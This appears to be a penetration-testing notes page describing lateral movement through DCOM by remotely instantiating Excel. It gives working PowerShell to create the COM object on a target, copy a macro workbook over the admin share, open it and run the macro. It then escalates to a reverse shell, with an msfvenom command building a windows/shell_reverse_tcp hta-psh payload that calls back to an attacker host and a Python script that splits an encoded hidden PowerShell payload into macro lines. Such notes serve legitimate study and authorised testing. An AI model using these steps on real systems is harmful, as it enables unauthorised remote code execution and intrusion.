---
description: Distributed Component Object Model
---

# DCOM

DCOM and COM date back to the early versions of the Windows OS. DCOM interaction is performed through RPC on TCP 135 with local administrator access required to call the Service Control Manager.

MS Office related DCOM objects allow lateral movement through the Office applications, therefore this method is best directed to workstations where MS Office is more likely to be installed.

Utilising GetTypeFromProgId and Get-Member to find a Run method to allow execution of Visual Basic of Applications (VBA) macros remotely.

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "10.10.10.10"))

$com | Get-Member Run
```

{% hint style="info" %}
$cmd | Get-Member can be run without argument to list all methods.
{% endhint %}

Excel and Publisher were found to have the same Variant Run, Word on the other hand has System.Object Run.

```
PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "10.10.10.10"))
PS C:\> $com | Get-Member Run


   TypeName: System.__ComObject#{91493442-5a91-11cf-8700-00aa0060263b}

Name MemberType Definition
---- ---------- ----------
Run  Method     Variant Run (string, SAFEARRAY(Variant))
```

### Creating the PoC

Run Excel and create a new workbook, navigate to View > Macros and input a name for your new macro and create it. Now enter the PoC code to run the Notepad application on execution, remembering to save the file type as a legacy format Excel 97-2003 .xls file format.

```
Sub mymacro()
    Shell ("notepad.exe")
End Sub
```

### Transferring the PoC

As we need to be local administrator we can leverage SMBs DCOM to transfer the file to the target machine via the Copy method.

```
PS C:\> $LocalPath = "C:\temp\myworkbook.xls"
PS C:\> $RemotePath = "\\10.10.10.10\C$\myworkbook.xls"
PS C:\> [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```

### Running the PoC

Before the PoC can be Run, it must be Opened. So again we call on $com from above to call the Worksbooks.Open method.

```
$Workbook = $com.Workbooks.Open("C:\myworkbook.xls")
$com.Run("mymacro")
```

{% hint style="info" %}
Should the opening result in a COMExcemption "OperationStopped", this is because DCOM is attempting to launch Excel with the SYSTEM account, which generally does not exist, so we must create the bare-bones of an account:\


```
$Path = "\\10.10.10.10\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
```
{% endhint %}

### Escalation of PoC

While notepad is nice, a reverse shell is nicer, to implement this utilise msvenom to create a Base64 hta-psh payload. Macros have a line length limit so the payload will need to be split to accommodate.

```
kali/kali $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 -f hta-psh -o evil-4444.hta
```

```
#!/usr/bin/python3
# Split msvenom hta-psh payload into macro managable strings
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBd..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
